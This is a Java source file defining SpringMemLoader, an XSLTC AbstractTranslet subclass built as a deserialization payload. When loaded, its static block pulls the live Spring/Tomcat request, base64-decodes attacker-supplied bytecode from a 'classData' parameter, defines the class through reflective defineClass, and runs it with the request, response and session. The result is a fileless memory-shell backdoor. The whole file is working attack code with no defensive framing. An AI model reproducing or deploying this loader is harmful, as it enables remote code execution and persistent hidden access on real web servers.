package org.sec;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class SpringMemLoader extends AbstractTranslet {
    static{
        try{
            javax.servlet.http.HttpServletRequest request =
                    ((org.springframework.web.context.request.ServletRequestAttributes)
                            org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();

            java.lang.reflect.Field r=request.getClass().getDeclaredField("request");
            r.setAccessible(true);
            org.apache.catalina.connector.Response response =
                    ((org.apache.catalina.connector.Request) r.get(request)).getResponse();
            javax.servlet.http.HttpSession session = request.getSession();

            String classData=request.getParameter("classData");
            System.out.println(classData);

            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class
                    .getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(SpringMemLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
            cc.newInstance().equals(new Object[]{request,response,session});
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}